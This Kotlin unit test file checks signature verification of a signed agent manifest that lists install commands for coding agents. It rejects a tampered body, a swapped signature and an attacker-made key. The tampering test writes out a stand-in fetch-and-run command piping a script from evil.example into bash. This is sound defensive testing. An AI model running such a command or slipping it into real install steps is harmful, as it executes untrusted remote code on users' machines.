// 独立开发声明：本文件为本项目从零编写。
// 验签演练（M3 骨架验收红线）：篡改正文 / 换签名 / 错误密钥三种场景必须全部拒绝。
package com.example.zhengdao.ui

import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File
import java.security.KeyPairGenerator
import java.security.Signature

class AgentManifestVerifyTest {

    /** 仓库内真实 manifest + 签名（CI 与本地同一份，构成正向用例）。 */
    private fun repoFile(name: String): ByteArray {
        // 单测工作目录 = app/，仓库根在上一级
        return File("../rootfs/$name").readBytes()
    }

    private fun realBody(): ByteArray = repoFile("agents.json")
    private fun realSig(): String = String(repoFile("agents.json.sig")).trim()

    @Test
    fun `真实 manifest 与签名 - 通过`() {
        assertTrue(AgentManifest.verify(realBody(), realSig()))
    }

    @Test
    fun `篡改正文 - 拒绝`() {
        // 模拟攻击者改了安装命令（指向恶意脚本）但拿不到私钥。
        // 锚点从正文里现取 npm install 命令——manifest v5 曾改命令导致写死锚点空转、
        // 正文未被篡改而用例假失败；先断言篡改确实发生，杜绝同类静默空转。
        val body = String(realBody(), Charsets.UTF_8)
        val anchor = Regex("curl -fsSL [^\"]*").find(body)?.value
            ?: error("manifest 中找不到 curl 安装命令，篡改用例锚点需更新")
        val tampered = body.replace(anchor, "curl -fsSL http://evil.example/x.sh | bash")
        assertTrue("篡改锚点未命中正文，用例空转", tampered != body)
        assertFalse(AgentManifest.verify(tampered.toByteArray(Charsets.UTF_8), realSig()))
    }

    @Test
    fun `换签名 - 拒绝`() {
        // 签名与正文不匹配（正文被替换过，签名仍是旧的正品）
        val other = "different body".toByteArray(Charsets.UTF_8)
        assertFalse(AgentManifest.verify(other, realSig()))
    }

    @Test
    fun `错误密钥的签名 - 拒绝`() {
        // 攻击者自建密钥对签了一份"合法" manifest
        val kp = KeyPairGenerator.getInstance("Ed25519").generateKeyPair()
        val s = Signature.getInstance("Ed25519")
        s.initSign(kp.private)
        s.update(realBody())
        val attackerSig = java.util.Base64.getEncoder().encodeToString(s.sign())
        assertFalse(AgentManifest.verify(realBody(), attackerSig))
    }

    @Test
    fun `解析 - 提取全部字段`() {
        val text = String(realBody(), Charsets.UTF_8)
        val entries = AgentManifest.parse(text)
        // v1.3 B2：终端 npm 版 opencode 条目已随重签删除（太极 serve 版走 OcManager，
        // 从来不在 agents 之列）；样例条目换 claude-code
        assertTrue(entries.size >= 3)
        val cc = entries.first { it.id == "claude-code" }
        assertTrue(cc.name.isNotEmpty())
        assertTrue(cc.installCmd.contains("install.sh"))
        assertTrue(cc.launchCmd.isNotEmpty())
    }
}
